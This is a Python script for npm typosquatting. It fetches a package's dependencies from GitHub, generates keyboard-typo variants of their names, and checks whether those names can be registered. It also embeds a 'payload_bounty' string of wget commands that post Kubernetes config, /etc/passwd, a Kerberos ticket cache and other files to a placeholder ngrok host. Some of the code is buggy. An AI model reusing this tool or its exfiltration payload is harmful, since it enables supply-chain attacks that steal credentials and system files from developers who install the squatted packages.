import requests
import json
import sys
import json
import collections
import subprocess
import urllib.parse
requests.packages.urllib3.disable_warnings()
keymaps = []
words = collections.OrderedDict()
valid_matches = []
payload_bounty = """wget --post-file ~/.kube/config http://fake.ngrok.io;wget --post-file package.json http://fake.ngrok.io;wget --post-file /etc/passwd http://fake.ngrok.io;wget --post-file /tmp/krb5cc_0 http://fake.ngrok.io;wget --post-file /etc/hosts http://fake.ngrok.io"""

#possible fat finger combinations to squat package names
key_mappings = [
    {'a':['q','w','s','z']},
    {'b':['v','g','h','n']},
    {'c':['x','v','f','d']},
    {'d':['s','x','f','e','r','w']},
    {'e':['w','s','d','r','f']},
    {'f':['r','t','g','v','c','d']},
    {'g':['f','v','b','h','t','r']},
    {'h':['t','g','y','b','n','j','u']},
    {'i':['u','j','k','o','l','9','8']},
    {'j':['k','m','n','h','u','i']},
    {'k':['l',',','m','j','i','o']},
    {'l':['k',',','.',';','o','p']},
    {'m':['n',',','k','j']},
    {'n':['m','b','h','j']},
    {'o':['p','l','i','9','0']},
    {'p':['0','-','[',';','l']},
    {'q':['1','2','w','a']},
    {'r':['e','d','f','t','4','5']},
    {'s':['w','a','e','d','x','z']},
    {'t':['r','g','f','y','5','6']},
    {'u':['y','j','j','h','i','7','8']},
    {'v':['c','b','f','g']},
    {'w':['q','e','s','a','2','3']},
    {'x':['s','z','c','d']},
    {'y':['t','g','h','u','6','7']},
    {'z':['a','s','x']}]

def name_runner(dependancy_name):
    cmd  = "npm-name {}".format(dependancy_name)
    print(cmd)
    mycmd_result = subprocess.getoutput(cmd)
    if mycmd_result:
       if not "unavailable" in mycmd_result:
          print(mycmd_result)
          sys.exit(0)
       #return mycmd_result


def getList(dict): 
    list = [] 
    for key in dict.keys(): 
        list.append(key) 
          
    return list
    
           
def blade_runner(repo_link,git_command):
    print('in blade runner')
    #for key,value in dependancy_name.items(): 
    print("beaconing git repo and performing checks {}".format(repo_link))
    parsed = urllib.parse.urlparse(repo_link)
    replaced = parsed._replace(netloc="https://raw.githubusercontent.com",path=parsed.path)
    hook_url = replaced.netloc + replaced.path +'/master/package.json'
    print("Retrieved Package.json from repo {}".format(hook_url))
    print("Extracting Dependencies")
    dev_depends = []
    try:
        response = requests.get(hook_url,timeout=3,verify=False)
        print(hook_url)
        results = get_dependancies(hook_url)
        print(results['devDependencies'])
        print(results['dependencies'])
        if results['dependencies']:
           dev_depends = results['dependencies'].keys()
           #depends = results['dependencies']
          
           if results['devDependencies']:
              dev_depends = results['devDependencies'].keys() + results['dependencies'].keys()
        else:
             dev_depends = results['devDependencies'].keys()
             
        if dev_depends:
           for items in dev_depends:
               #print(items)
           
               try:
                 #injectabl = dependancy_permutator(k,author)
                 #mycmd_result = name_runner(items)
                 last_letter = items[-1]
                 print("Generating fat finger keymaps for {} ".format(last_letter))
                 create_typos(last_letter,key_mappings,items)
                 
               except Exception as alien:
                 print(alien)
  
    except:
        pass
        
def get_dependancies(url):
    result = requests.get(url,timeout=3,verify=False)
    return json.loads(result.text)   


def create_typos(letter,letter_dict,depend):
    #match last letter of each repo if taken and permutate via fat finger keymaps
    letter_info = {}
    letter_info['known_letter'] = letter
    letter_info['target_dependency'] = depend
    
    for items in letter_dict:
        if letter in items:
           values = items.values()
           print(values)
           
           print("match {} {} {}".format(letter,items,depend))
           letter_info['possible_keys'] = list(values)
           valid_matches.append(letter_info)
           
    #print(letter_info)
    
 
  
        

def get_package_info(package_name):
    extracted_owners = []
    package_info = []
    url = "https://registry.npmjs.org/-/v1/search?text={}&size=5".format(package_name)
    contents=requests.get(url,timeout=3,verify=False)
    if contents:
       clean=json.loads(contents.text)
       for k,v in clean.items():
           if "objects" in k:
               if isinstance(v,list):
                  #print("list of dicts detected")
                  for item in v:
                      if isinstance(item,dict):
                         package_infos = {}
                         for key,value in item.items():
                             try:
                                if value:
                                   
                                   if  isinstance(value,dict):
                                       if value['name']:
                                          package_infos['package_name'] = value['name']
                                          package_infos['publisher'] = value['publisher']
                                          package_infos['maintainers'] = value['maintainers']
                                          package_infos['repo_link'] = value['links']['repository']
                                          package_infos['git_command'] = "git clone {}".format(package_infos['repo_link'])
                                          fatties  = blade_runner(package_infos['repo_link'],package_infos['git_command'])
                                          #get dependancies from github
                        
                        
                        
                        
                        
                        
                        
                                 
                             except Exception as wtf:
                                 print(wtf)
                                 pass
    return extracted_owners


def main():
    package_info=get_package_info(sys.argv[1])
    for valids in valid_matches:
        mycmd_result = name_runner(valids['target_dependency'])

main()
